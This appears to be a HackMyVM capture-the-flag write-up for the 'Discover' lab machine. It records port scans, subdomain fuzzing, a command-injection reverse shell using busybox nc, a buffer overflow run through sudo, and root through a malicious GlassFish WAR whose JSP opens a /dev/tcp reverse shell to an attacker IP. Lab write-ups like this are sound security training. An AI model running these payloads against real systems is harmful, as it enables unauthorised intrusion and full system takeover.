# Discover

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.206:80
Open 10.0.2.206:3700
Open 10.0.2.206:3820
Open 10.0.2.206:3920
Open 10.0.2.206:4848
Open 10.0.2.206:7676
Open 10.0.2.206:8080
Open 10.0.2.206:8181
Open 10.0.2.206:8686
Open 10.0.2.206:33967
Open 10.0.2.206:34897
Open 10.0.2.206:42917
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.206
PORT      STATE SERVICE              REASON  VERSION
80/tcp    open  http                 syn-ack Apache httpd 2.4.54
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to http://discover.hmv/
3700/tcp  open  giop                 syn-ack
| fingerprint-strings: 
|   GetRequest, X11Probe: 
|     GIOP
|   giop: 
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     127.0.1.1
|     127.0.1.1
|_    default
3820/tcp  open  ssl/giop             syn-ack
| fingerprint-strings: 
|   GetRequest, X11Probe: 
|     GIOP
|   giop: 
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     127.0.1.1
|     127.0.1.1
|_    default
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Issuer: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-22T16:19:00
| Not valid after:  2031-05-20T16:19:00
| MD5:   0b58:ea49:e0e1:0013:67a0:0ede:d007:fb84
| SHA-1: 5dea:602a:3d43:65fd:a141:3bb5:bea0:2320:f87a:cb96
| -----BEGIN CERTIFICATE-----
| MIIDmTCCAoGgAwIBAgIEFr+FQDANBgkqhkiG9w0BAQsFADB9MQswCQYDVQQGEwJD
| QTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0YXdhMSMwIQYDVQQKExpF
| Y2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UECxMJR2xhc3NGaXNoMRIw
| EAYDVQQDEwlsb2NhbGhvc3QwHhcNMjEwNTIyMTYxOTAwWhcNMzEwNTIwMTYxOTAw
| WjB9MQswCQYDVQQGEwJDQTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0
| YXdhMSMwIQYDVQQKExpFY2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UE
| CxMJR2xhc3NGaXNoMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDI1/xR4GcIAsIfJ+BCb7q/NZvwLkhDthYkR20kCpia
| LXyHfu697WTGCMe9jywBEYpa5JMge4ubOqLWwhZq9xAcVo1kv/t9iYByrgbOzvLT
| FvxlfWv5beeRQADo9r+PwtPNbWD+VzPTASEWNs7GDOV1nTzyXVDUgzNBwJWk9waI
| qCOyvfWb9Bl9moQLD0amNp6iCKIsEU+bpvREZFBoN6CiYcQdmkO5ie8hwbxPhQOk
| zBDhL5/XtPXES+Y99XjXPheiJn/lv9r1wEoJqwhYOgrDZC9jzPP1c879kG9cKso8
| 9YKUdKZsIQ4Vn/y8qFm/19o/fvl+WiG1lOmqL++1yenDAgMBAAGjITAfMB0GA1Ud
| DgQWBBRwGYN8tv57bJNlgoWzTFGbnh0USjANBgkqhkiG9w0BAQsFAAOCAQEAswUf
| 0tmSulCmt9JobZuI7Mp2ttmicRHcmLW7VEBD92GvQbopEAzd3G4+Y+J7mgNXQn4l
| wOEMduGoztZUrtRt/0SmHr99mmGO3qNpyGRF/il8iPBOwrBeYREgzPds2T04NCe/
| 6n100EmCyXw0SXBMzQW4CFN6k+w/+mGL9bsG4d8+1wfZGssCKzSwFYUUN9BqDc3I
| EKEp2/NyvaZYH5FTP/HnmkdEanCeIuGNxGK9hoYHC2H38cbUGdJxDZJybNCFZ6le
| w5iCZRknr73qCQHiMLn3AMT+C2tkmK1EnKC/L4phikiCHN+w5Gn/s0PXqmHtkTqQ
| 0BLjvy992do5GE6ISQ==
|_-----END CERTIFICATE-----
3920/tcp  open  ssl/exasoftport1?    syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Issuer: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-22T16:19:00
| Not valid after:  2031-05-20T16:19:00
| MD5:   0b58:ea49:e0e1:0013:67a0:0ede:d007:fb84
| SHA-1: 5dea:602a:3d43:65fd:a141:3bb5:bea0:2320:f87a:cb96
| -----BEGIN CERTIFICATE-----
| MIIDmTCCAoGgAwIBAgIEFr+FQDANBgkqhkiG9w0BAQsFADB9MQswCQYDVQQGEwJD
| QTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0YXdhMSMwIQYDVQQKExpF
| Y2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UECxMJR2xhc3NGaXNoMRIw
| EAYDVQQDEwlsb2NhbGhvc3QwHhcNMjEwNTIyMTYxOTAwWhcNMzEwNTIwMTYxOTAw
| WjB9MQswCQYDVQQGEwJDQTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0
| YXdhMSMwIQYDVQQKExpFY2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UE
| CxMJR2xhc3NGaXNoMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDI1/xR4GcIAsIfJ+BCb7q/NZvwLkhDthYkR20kCpia
| LXyHfu697WTGCMe9jywBEYpa5JMge4ubOqLWwhZq9xAcVo1kv/t9iYByrgbOzvLT
| FvxlfWv5beeRQADo9r+PwtPNbWD+VzPTASEWNs7GDOV1nTzyXVDUgzNBwJWk9waI
| qCOyvfWb9Bl9moQLD0amNp6iCKIsEU+bpvREZFBoN6CiYcQdmkO5ie8hwbxPhQOk
| zBDhL5/XtPXES+Y99XjXPheiJn/lv9r1wEoJqwhYOgrDZC9jzPP1c879kG9cKso8
| 9YKUdKZsIQ4Vn/y8qFm/19o/fvl+WiG1lOmqL++1yenDAgMBAAGjITAfMB0GA1Ud
| DgQWBBRwGYN8tv57bJNlgoWzTFGbnh0USjANBgkqhkiG9w0BAQsFAAOCAQEAswUf
| 0tmSulCmt9JobZuI7Mp2ttmicRHcmLW7VEBD92GvQbopEAzd3G4+Y+J7mgNXQn4l
| wOEMduGoztZUrtRt/0SmHr99mmGO3qNpyGRF/il8iPBOwrBeYREgzPds2T04NCe/
| 6n100EmCyXw0SXBMzQW4CFN6k+w/+mGL9bsG4d8+1wfZGssCKzSwFYUUN9BqDc3I
| EKEp2/NyvaZYH5FTP/HnmkdEanCeIuGNxGK9hoYHC2H38cbUGdJxDZJybNCFZ6le
| w5iCZRknr73qCQHiMLn3AMT+C2tkmK1EnKC/L4phikiCHN+w5Gn/s0PXqmHtkTqQ
| 0BLjvy992do5GE6ISQ==
|_-----END CERTIFICATE-----
4848/tcp  open  appserv-http?        syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Set-Cookie: JSESSIONID=8518b6cd74ca6702b8be90368cf8; Path=/; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html>
|     <head>
|     <title>Login</title>
|     <script type="text/javascript">
|     <!-- FIXME: add code to ensure we're the top-most frame -->
|     (document.getElementById('layout-doc') != null) {
|     Just refresh the page... login will take over
|     window.location = window.location;
|     </script>
|     <style type="text/css">
|     clickjacking defense */
|     body { display : none; }
|     </style>
|     <link rel="stylesheet" type="text/css" href="/theme/com/sun/webui/jsf/suntheme/css/css_master.css" />
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Set-Cookie: JSESSIONID=851907c7698200042f41119fdf0b; Path=/; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html>
|     <head>
|     <title>Login</title>
|     <script type="text/javascript">
|     <!-- FIXME: add code to ensure we're the top-most frame -->
|     (document.getElementById('layout-doc') != null) {
|     Just refresh the page... login will take over
|     window.location = window.location;
|     </script>
|     <style type="text/css">
|     clickjacking defense */
|     body { display : none; }
|     </style>
|_    <link rel="stylesheet" type="text/css" href="/theme/com/sun/webui/jsf/suntheme/css/css_master.css" />
7676/tcp  open  java-message-service syn-ack Java Message Service 301
8080/tcp  open  http-proxy           syn-ack Eclipse GlassFish  6.1.0 
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Eclipse GlassFish - Server Running
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Accept-Ranges: bytes
|     ETag: W/"3668-1621714756000"
|     Last-Modified: Sat, 22 May 2021 20:19:16 GMT
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 3668
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html lang="en">
|     <!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     Copyright (c) 2020 Contributors to the Eclipse Foundation.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are s
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 13 Feb 2026 18:44:20 GMT
|     Connection: close
|_    Content-Length: 0
|_http-server-header: Eclipse GlassFish  6.1.0 
8181/tcp  open  ssl/intermapper?     syn-ack
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Accept-Ranges: bytes
|     ETag: W/"3668-1621714756000"
|     Last-Modified: Sat, 22 May 2021 20:19:16 GMT
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 3668
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html lang="en">
|     <!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     Copyright (c) 2020 Contributors to the Eclipse Foundation.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are s
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 13 Feb 2026 18:44:37 GMT
|     Connection: close
|_    Content-Length: 0
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Issuer: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-22T16:19:00
| Not valid after:  2031-05-20T16:19:00
| MD5:   0b58:ea49:e0e1:0013:67a0:0ede:d007:fb84
| SHA-1: 5dea:602a:3d43:65fd:a141:3bb5:bea0:2320:f87a:cb96
| -----BEGIN CERTIFICATE-----
| MIIDmTCCAoGgAwIBAgIEFr+FQDANBgkqhkiG9w0BAQsFADB9MQswCQYDVQQGEwJD
| QTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0YXdhMSMwIQYDVQQKExpF
| Y2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UECxMJR2xhc3NGaXNoMRIw
| EAYDVQQDEwlsb2NhbGhvc3QwHhcNMjEwNTIyMTYxOTAwWhcNMzEwNTIwMTYxOTAw
| WjB9MQswCQYDVQQGEwJDQTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0
| YXdhMSMwIQYDVQQKExpFY2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UE
| CxMJR2xhc3NGaXNoMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDI1/xR4GcIAsIfJ+BCb7q/NZvwLkhDthYkR20kCpia
| LXyHfu697WTGCMe9jywBEYpa5JMge4ubOqLWwhZq9xAcVo1kv/t9iYByrgbOzvLT
| FvxlfWv5beeRQADo9r+PwtPNbWD+VzPTASEWNs7GDOV1nTzyXVDUgzNBwJWk9waI
| qCOyvfWb9Bl9moQLD0amNp6iCKIsEU+bpvREZFBoN6CiYcQdmkO5ie8hwbxPhQOk
| zBDhL5/XtPXES+Y99XjXPheiJn/lv9r1wEoJqwhYOgrDZC9jzPP1c879kG9cKso8
| 9YKUdKZsIQ4Vn/y8qFm/19o/fvl+WiG1lOmqL++1yenDAgMBAAGjITAfMB0GA1Ud
| DgQWBBRwGYN8tv57bJNlgoWzTFGbnh0USjANBgkqhkiG9w0BAQsFAAOCAQEAswUf
| 0tmSulCmt9JobZuI7Mp2ttmicRHcmLW7VEBD92GvQbopEAzd3G4+Y+J7mgNXQn4l
| wOEMduGoztZUrtRt/0SmHr99mmGO3qNpyGRF/il8iPBOwrBeYREgzPds2T04NCe/
| 6n100EmCyXw0SXBMzQW4CFN6k+w/+mGL9bsG4d8+1wfZGssCKzSwFYUUN9BqDc3I
| EKEp2/NyvaZYH5FTP/HnmkdEanCeIuGNxGK9hoYHC2H38cbUGdJxDZJybNCFZ6le
| w5iCZRknr73qCQHiMLn3AMT+C2tkmK1EnKC/L4phikiCHN+w5Gn/s0PXqmHtkTqQ
| 0BLjvy992do5GE6ISQ==
|_-----END CERTIFICATE-----
8686/tcp  open  java-rmi             syn-ack Java RMI
| rmi-dumpregistry: 
|   debian/7676/jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:33967
|     extends
|       java.rmi.server.RemoteStub
|       extends
|         java.rmi.server.RemoteObject
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
33967/tcp open  java-rmi             syn-ack Java RMI
34897/tcp open  unknown              syn-ack
42917/tcp open  unknown              syn-ack
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: Host: discover.hmv
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/discover/writeup.png)

Login and Register is broken and doesn't work, also the login includes username and password in GET request
- [http://discover.hmv/loginltc.php?fname=let%40me.in&pwd=let%40me.in](http://discover.hmv/loginltc.php?fname=let%40me.in&pwd=let%40me.in)

```bash
‚îî‚îÄ$ feroxbuster -u http://discover.hmv/ --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET      114l      319w     3166c http://discover.hmv/contactform/contactform.js
200      GET       31l       71w      872c http://discover.hmv/js/custom.js
200      GET      665l     1386w    19066c http://discover.hmv/courses.php
200      GET      538l     1253w    17734c http://discover.hmv/aboutus.php
500      GET       52l       81w     1430c http://discover.hmv/adpayment.php
500      GET       60l       90w     1564c http://discover.hmv/admessage.php
500      GET       51l       79w     1414c http://discover.hmv/adsuggestion.php
301      GET        9l       28w      313c http://discover.hmv/assets => http://discover.hmv/assets/
301      GET        9l       28w      314c http://discover.hmv/courses => http://discover.hmv/courses/
200      GET       37l       61w     1351c http://discover.hmv/payment.php
200      GET       34l       52w     1239c http://discover.hmv/loginltc.php
200      GET       37l       62w     1396c http://discover.hmv/signupltc.php
200      GET       33l       56w     1277c http://discover.hmv/review.php
200      GET       36l       60w     1363c http://discover.hmv/contact.php
200      GET      777l     2149w    29575c http://discover.hmv/home.php
200      GET      777l     2149w    29575c http://discover.hmv/
301      GET        9l       28w      312c http://discover.hmv/fonts => http://discover.hmv/fonts/
200      GET       33l       38w     1063c http://discover.hmv/forgotpassword.php
200      GET      322l      684w     8895c http://discover.hmv/adminpanel.php
301      GET        9l       28w      310c http://discover.hmv/img => http://discover.hmv/img/
301      GET        9l       28w      309c http://discover.hmv/js => http://discover.hmv/js/
302      GET        1l        3w       22c http://discover.hmv/logout.php => home.php
301      GET        9l       28w      313c http://discover.hmv/manual => http://discover.hmv/manual/
500      GET       55l       77w     1394c http://discover.hmv/usersuggestion.php
200      GET      295l      441w     6302c http://discover.hmv/myaccount.php
500      GET       76l      176w     1339c http://discover.hmv/statistics.php
```

Almost nothing works on main website :D

### Command Injection

Subdomain discovery reveals new subdomain
```bash
‚îî‚îÄ$ domain='discover.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fw 18
log                     [Status: 200, Size: 822, Words: 107, Lines: 23, Duration: 3ms]
```

The login panel doesn't exactly work either, but if you enable form from HTML you can make submition. Username is hardcoded, and for some reason changing to system command renders output?...

![writeup-1.png](/assets/pentest/hackmyvm/discover/writeup-1.png)

```bash
‚îî‚îÄ$ curl 'http://log.discover.hmv/index.php' -G --data-urlencode 'username=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
‚îî‚îÄ$ penelope -p 4444
www-data@debian:/var/www/html/botdiscover$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (discover)

Username is found in PHP code, but it's not password to linux account
```bash
www-data@debian:/var/www/html/botdiscover$ cat index.php | sed -n '/<?php/,/?>/p'
<?php
if(isset($_GET["username"])){
  echo shell_exec($_GET["username"]);
  if($_GET["username"] == "Discover" && $_GET["password"] == "ufoundmypassword") { echo "WELLDONE"; }
}
?>
```

Nothing in DB
```bash
www-data@debian:/var/www/html/discover$ cat mydb.php
...
$localhost = "localhost";
$usernamew = "root";
$passwordw = "root";
$db = "expdb";
$conn = mysqli_connect($localhost,$usernamew,$passwordw,$db);
...
www-data@debian:/var/www/html/discover$ mysql -u'root' -p'root' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sccommunity        |
+--------------------+
www-data@debian:/var/www/html/discover$ mysql -u'root' -p'root' 'sccommunity' -e 'SHOW TABLES;'
+-----------------------+
| Tables_in_sccommunity |
+-----------------------+
| posts                 |
| uploads               |
| users                 |
+-----------------------+
www-data@debian:/var/www/html/discover$ mysql -u'root' -p'root' 'sccommunity' -e 'SELECT * FROM users;'
+--------+----------+--------------+-------------+------------------------------------------------------------------------+
| userid | username | fullname     | password    | description                                                            |
+--------+----------+--------------+-------------+------------------------------------------------------------------------+
|      1 | tom      | Major Tom    | spaceiscold | I'm stepping through the door, and I'm floating in a most peculiar way |
|      2 | bobby    | Bobby Tables | hackme      | My name is Bobby Tables. Black holes are cool                          |
+--------+----------+--------------+-------------+------------------------------------------------------------------------+
www-data@debian:/var/www/html/discover$ mysql -u'root' -p'root' 'sccommunity' -e 'SELECT * FROM posts;'
+--------+--------+-----------------------------+------------------------------------------------+
| postid | userid | title                       | text                                           |
+--------+--------+-----------------------------+------------------------------------------------+
|      1 |      1 | Ground control to Major Tom | Take your protein pills and put your helmet on |
+--------+--------+-----------------------------+------------------------------------------------+
www-data@debian:/var/www/html/discover$ mysql -u'root' -p'root' 'sccommunity' -e 'SELECT * FROM uploads;'
```

```bash
www-data@debian:/var/www/html/botdiscover$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (discover) NOPASSWD: /opt/overflow
```

Cool, we can't read file so blind overflow?...
```bash
www-data@debian:/opt$ ls -alh
total 28K
drwxr-xr-x  3 root root 4.0K Aug 30  2022 .
drwxr-xr-x 18 root root 4.0K Aug 24  2022 ..
drwxr-xr-x  7 root root 4.0K May 22  2021 glassfish6
-rw-r--r--  1 root root   44 Aug 30  2022 hint
-rwx--x--x  1 root root 8.7K Aug 30  2022 overflow

www-data@debian:/opt$ cat hint
AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00
```

Confusion over 9000, we were given solution not a hint :D And without read how are you supposed to exploit?
```bash
www-data@debian:/opt$ sudo -u discover /opt/overflow $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + b"\x5d\x06\x40\x00")')
$ id
uid=1000(discover) gid=1000(discover) groups=1000(discover),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### User.txt

```bash
discover@debian:~$ cat User.txt
c7d0a8de1e03b25a6f7ed2d91b94dad6
```

## Privilege Escalation (root)

```bash
discover@debian:~$ sudo -l
Matching Defaults entries for discover on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User discover may run the following commands on debian:
    (root) NOPASSWD: /opt/glassfish6/bin/asadmin
```

Most commands require admin/password, I think only for `domain1`
```bash
discover@debian:/opt/glassfish6$ sudo /opt/glassfish6/bin/asadmin list-domains
domain1 running
Command list-domains executed successfully.
```

We can create another domain without it prompting for password
```bash
discover@debian:/opt/glassfish6$ sudo /opt/glassfish6/bin/asadmin create-domain domain2
Enter admin user name [Enter to accept default "admin" / no password]>
Default port 4848 for Admin is in use. Using 42555
Default port 8080 for HTTP Instance is in use. Using 42893
Default port 7676 for JMS is in use. Using 36041
Default port 3700 for IIOP is in use. Using 45799
Default port 8181 for HTTP_SSL is in use. Using 36819
Default port 3820 for IIOP_SSL is in use. Using 45439
Default port 3920 for IIOP_MUTUALAUTH is in use. Using 33045
Default port 8686 for JMX_ADMIN is in use. Using 34355
Using default port 6666 for OSGI_SHELL.
Using default port 9009 for JAVA_DEBUGGER.
Distinguished Name of the self-signed X.509 Server Certificate is:
[CN=debian,OU=GlassFish,O=Eclipse.org Foundation Inc,L=Ottawa,ST=Ontario,C=CA]
Distinguished Name of the self-signed X.509 Server Certificate is:
[CN=debian-instance,OU=GlassFish,O=Eclipse.org Foundation Inc,L=Ottawa,ST=Ontario,C=CA]
Domain domain2 created.
Domain domain2 admin port is 42555.
Domain domain2 allows admin login as user "admin" with no password.
Command create-domain executed successfully.
```

Start the domain
```bash
discover@debian:/opt/glassfish6$ sudo /opt/glassfish6/bin/asadmin start-domain domain2
Waiting for domain2 to start ................................
Successfully started the domain : domain2
domain  Location: /opt/glassfish6/glassfish/domains/domain2
Log File: /opt/glassfish6/glassfish/domains/domain2/logs/server.log
Admin Port: 42555
Command start-domain executed successfully.
```

Create malicious package
```bash
discover@debian:/opt/glassfish6$ mkdir /tmp/evil
discover@debian:/opt/glassfish6$ echo '<%Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.0.2.149/4444 0>&1"});%>' > /tmp/evil/cmd.jsp
discover@debian:/opt/glassfish6$ cd /tmp/evil
discover@debian:/opt/glassfish6$ jar cf /tmp/evil.war cmd.jsp
```

Deploy malicious application
```bash
discover@debian:/tmp/evil$ sudo /opt/glassfish6/bin/asadmin --port 42555 deploy /tmp/evil.war
Application deployed with name evil.
Command deploy executed successfully.
```

Trigger the payload
```bash
discover@debian:/tmp/evil$ curl http://localhost:42893/evil/cmd.jsp
[+] Got reverse shell from debian~10.0.2.206-Linux-x86_64 üòçÔ∏è Assigned SessionID <2>
[!] Session detached ‚á≤ # F12
(Penelope)‚îÄ(Session [1])> sessions 2
root@debian:/opt/glassfish6/glassfish/domains/domain2/config# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@debian:/opt/glassfish6/glassfish/domains/domain2/config# cat /root/Root.txt
7140a59e697f44b8a8581cc85df76f4c
```